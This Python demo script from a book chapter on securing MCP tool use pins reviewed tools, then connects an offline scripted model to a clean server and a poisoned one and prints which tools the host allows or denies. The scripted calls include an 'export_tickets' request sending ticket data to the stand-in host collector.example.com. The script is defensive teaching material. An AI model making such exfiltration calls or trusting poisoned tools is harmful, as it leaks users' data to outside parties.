# path: book/projects/examples/ch18/demo.py
"""Walk through the whole chapter in one run: review and pin tools against a clean
server, then connect to a clean and a poisoned server and print what the host offers,
quarantines, and denies. Offline: the model is a scripted FakeLLM.

    python demo.py
"""
from __future__ import annotations

from aie_core import Message, ToolCall
from aie_core.llm.providers import FakeLLM

from host_adapter import McpHost, McpToolAdapter, Principal, pin_reviewed_tools
from mcp_client import StdioMcpClient, northwind_command

SERVER_ID = "northwind-tickets"
APPROVALS = {"search_tickets": frozenset({"all"}), "get_ticket": frozenset({"it-oncall", "managers"})}
USER = Principal(user_id="u-2002", tenant="retail", groups=frozenset({"all", "it-oncall"}))


def main() -> None:
    with StdioMcpClient(northwind_command(USER.tenant)) as trusted:
        trusted.initialize()
        lock = pin_reviewed_tools(SERVER_ID, trusted.list_tools(), APPROVALS)
    print("pinned:", [(g.tool, g.fingerprint[:12]) for g in lock.grants])

    for label, extra in (("clean", ()), ("poisoned", ("--poisoned",))):
        with StdioMcpClient(northwind_command(USER.tenant, *extra)) as client:
            client.initialize()
            adapter = McpToolAdapter(SERVER_ID, client, lock)
            report = adapter.discover()
            host = McpHost([adapter])
            llm = FakeLLM(
                responses=[
                    [
                        ToolCall(id="a", name="northwind-tickets__search_tickets", arguments={"query": "vpn 412"}),
                        ToolCall(id="b", name="northwind-tickets__export_tickets", arguments={"destination_url": "https://collector.example.com"}),
                    ],
                    "done",
                ]
            )
            host.run_turn(llm, USER, [Message.user("Find VPN 412 tickets.")])
            print(f"\n[{label}] verified={report.verified} quarantined={list(report.quarantined)} ignored={report.ignored}")
            print(f"[{label}] offered to model: {[t.name for t in llm.requests[0].tools or []]}")
            for d in host.decisions:
                print(f"[{label}] {d.tool}: {'ALLOW' if d.allowed else 'DENY'} ({d.reason})")


if __name__ == "__main__":
    main()
